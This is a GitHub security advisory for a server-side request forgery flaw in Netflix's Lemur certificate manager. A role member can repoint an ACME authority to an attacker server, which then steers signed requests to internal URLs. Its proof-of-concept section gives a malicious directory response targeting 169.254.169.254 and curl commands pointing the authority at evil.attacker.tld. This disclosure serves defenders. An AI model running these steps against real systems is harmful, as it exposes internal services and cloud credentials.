# [H] Lemur: Server-Side Request Forgery via the ACME client following server-controlled URLs

## Summary
Severity: High
Advisory: GHSA-xpmj-wjcp-6pww
CVE: CVE-2026-70666
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-xpmj-wjcp-6pww
Type: github-advisory

## Affected
- PyPI: `lemur` — affected >=0 <1.9.3

## Details
### Summary
The ACME client (used to issue certificates from Let's Encrypt / Google Public CA / private ACME CAs) connects to an `acme_url`, then issues requests to URLs that the **ACME server returns** in its directory/order/authorization/finalize responses - this is the classic ACME-client SSRF (RFC 8555 design). Lemur validates `acme_url` against an allowlist of public ACME directories, but **only at authority creation**. The authority UPDATE path (`PUT /authorities/<id>`) accepts a new `options` blob with an arbitrary `acme_url` and never re-validates. An attacker who is a member of an authority's role can repoint an existing ACME authority at a malicious ACME server they control, which returns internal URLs in its responses - coercing Lemur into making JWS-signed POST requests to internal services during the next certificate issuance.

### Detail
**Defect A - allowlist only at creation.**
`_validate_acme_url` (`lemur/plugins/lemur_acme/plugin.py:35-53`) restricts the host to `{acme-v02.api.letsencrypt.org, acme-staging-v02.api.letsencrypt.org, dv.acme-v02.api.pki.goog}`. It runs **only inside `create_authority`** (lines 337, 481). The update path stores `options` verbatim:
```python
# lemur/authorities/views.py:417-424  (Authorities.put)
return service.update(
    authority_id,
    owner=data["owner"], description=data["description"],
    active=data["active"], roles=data["roles"],
    options=data.get("options")          # <- acme_url lives here, NO re-validation
)
```
`AuthorityUpdateSchema.options = fields.String()` (`authorities/schemas.py:101`) applies no validation. The docstring of `_validate_acme_url` even admits: *"existing authorities in the DB were already trusted when they were created and are not re-validated."*

**Defect B - ACME client follows server-supplied URLs.**
`setup_acme_client_no_retry` (`acme_handlers.py:161-162, 188-202`) reads `acme_url` from stored authority options and creates an ACME client. Per RFC 8555, the client:
1. `get_directory(acme_url)` -> server returns `newNonce`, `newOrder`, `revokeCert`, `keyChange` URLs.
2. `new_order()` -> server returns `finalize` and `authorizations` URLs.
3. `poll()`, `finalize_order()`, cert download -> all hit **server-chosen URLs**.

A malicious ACME server can return internal URLs for all of these.

**Authorization on update:** `Authorities.put` requires `AuthorityPermission(authority_id, roles)` (`views.py:412`), satisfied by `AuthorityOwnerNeed`/`AuthorityCreatorNeed` - i.e. any **member of the authority's role**, not a global admin. This is the standard role a certificate issuer holds.

**Source-to-sink trace:**
```
PUT /api/1/authorities/<id> (AuthorityPermission = authority-role member)
  -> service.update(options={"acme_url":"https://evil.attacker.tld/dir"})  <- no re-validation
… next certificate issuance against this authority …
  setup_acme_client_no_retry reads acme_url=evil.attacker.tld
    -> ACME client GET directory -> attacker returns newOrder=http://169.254.169.254/...
    -> Lemur POSTs JWS-signed request to internal URL
```

### Steps to Reproduce (POC)

**Step 1 - Attacker runs a malicious ACME directory server** (e.g. `evil.attacker.tld`) that returns internal URLs in its directory and order responses:
```python
# Minimal: a directory endpoint that points "newOrder" at an internal target
{
  "newNonce": "https://evil.attacker.tld/nonce",
  "newOrder": "http://169.254.169.254/latest/meta-data/",   # <- internal
  "revokeCert": "https://evil.attacker.tld/revoke",
  "keyChange": "https://evil.attacker.tld/key"
}
```

**Step 2 - Attacker (authority-role member) repoints an existing ACME authority:**
```bash
curl -k -X PUT https://lemur.example.com/api/1/authorities/42 \
  -H "Authorization: Bearer <JWT>" -H "Content-Type: application/json" \
  -d '{
    "name":"letsencrypt",
    "owner":"attacker@corp.com",
    "description":"x","active":true,
    "roles":[{"id":7,"name":"letsencrypt_operator"}],
    "options":"[{\"name\":\"acme_url\",\"value\":\"https://evil.attacker.tld/dir\"},{\"name\":\"chain\",\"value\":\"\"}]"
  }'
```

**Step 3 - Issue a certificate against the repointed authority** (via UI/API):
```bash
curl -k -X POST https://lemur.example.com/api/1/certificates \
  -H "Authorization: Bearer <JWT>" -H "Content-Type: application/json" \
  -d '{"commonName":"demo.example.com","owner":"attacker@corp.com",
       "authority":{"name":"letsencrypt"},"validityYears":1}'
```
The Lemur ACME client connects to `evil.attacker.tld`, reads the directory, and POSTs a JWS-signed request to `http://169.254.169.254/...` - internal SSRF achieved. (The JWS body, while structured, is attacker-influenceable via the ACME flow.)

> *Note:* This is config-dependent - it requires an ACME authority to exist (an admin must have created one). ACME is the primary recommended issuance path in Lemur, so this is a realistic deployment state.

### Impact
- **JWS-authenticated POSTs** to attacker-chosen internal URLs - stronger than blind GET SSRF: the request body is structured/signed and the account key + cloud DNS credentials are resident in the process during issuance.
- Reaches internal HTTP services, cloud metadata, Kubernetes API from the Lemur host.
- The combination (allowlist-bypass-on-update + server-supplied-URL-following) makes it reachable by a **non-admin** authority-role member without ever needing the admin-gated creation path.
- **Limitation:** requires ACME to be in use. Not default-deploy by itself, but ACME is the recommended issuance method.

### Fix
1. Re-run `_validate_acme_url` inside `authorities/service.update` / `update_options`, or make `acme_url` **immutable** after authority creation.
2. In the ACME client wrapper, **pin every outbound request host** to the allowlisted directory host: reject any directory/order/finalize URL whose hostname ≠ the configured `acme_url` hostname.

## References
- https://github.com/Netflix/lemur/security/advisories/GHSA-xpmj-wjcp-6pww
- https://github.com/Netflix/lemur/commit/6dcb19b6d6004e97796d6a0344b130b2ba57f050
- https://github.com/Netflix/lemur
- https://github.com/Netflix/lemur/releases/tag/v1.9.3
